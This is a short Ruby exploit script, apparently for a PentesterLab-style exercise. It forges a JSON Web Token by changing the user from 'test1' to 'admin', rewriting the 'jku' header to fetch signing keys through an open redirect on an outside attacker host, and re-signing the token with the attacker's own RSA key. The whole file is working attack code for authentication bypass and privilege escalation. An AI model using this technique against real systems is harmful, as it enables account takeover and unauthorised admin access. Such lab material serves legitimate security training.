require 'uri'
require 'base64'
require 'openssl'
require 'json'

# /register?redirect_uri=

cookie = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9wdGwtMTc5OTRmNTAtMzI5NTg0MTYubGliY3VybC5zby8ud2VsbC1rbm93bi8vandrcy5qc29uIn0.eyJ1c2VyIjoidGVzdDEifQ.F4LWYxYmlCH-MI7ny_uvMKDJfzBXpQciCXvifj6Ro1EGla-8cbZQz0JhH0e46ltANtQ3Aq8LZNDDfMtFFsJZnTTLtzTtz1q49QxwZo60ZFEE10ihm1pWXEpVg-iXJyRN_tCCtBtFWdHbocuLYtAMbmbKiVPy9c5pldD7r-6McOq2TECM_AScUuLYah1PespO0YMrjzrtAxsrlVM1P0PuuI7cMfgekPL5VUugN8X7yo7HFwHRrWncDhZFbYe9LD54_w-ygPa9wrbBJkZF3sLPvyP2Y8CJifk78Cy3Hr-TVgXKxCcDpNeOISN29jyFa6Ik9CxpvzBYTc8CYEmbKsY7eg'

header, payload, signature = cookie.split('.')

decoded_header = Base64.decode64(header)
decoded_payload = Base64.decode64(payload)

decoded_payload.gsub!("test1","admin")
decoded_header.gsub!("http://ptl-17994f50-32958416.libcurl.so/.well-known//jwks.json", "http://ptl-17994f50-32958416.libcurl.so/.well-known/../redirect?redirect_uri=http://bennettscash.no-ip.org/jwks.json")

puts decoded_header
puts decoded_payload

token = Base64.urlsafe_encode64(decoded_header).gsub("=","") + "." + Base64.urlsafe_encode64(decoded_payload).gsub("=", "")

priv = OpenSSL::PKey::RSA.new File.read 'private.pem'
pub = priv.public_key
n = Base64.urlsafe_encode64(pub.n.to_s(2)).gsub(/=+$/,"")
e = Base64.urlsafe_encode64(pub.e.to_s(2)).gsub(/=+$/,"")

puts "n: " + n
puts "e: " + e

sign = priv.sign("SHA256", token)
puts token +"." + Base64.urlsafe_encode64(sign).gsub(/=+$/, "")

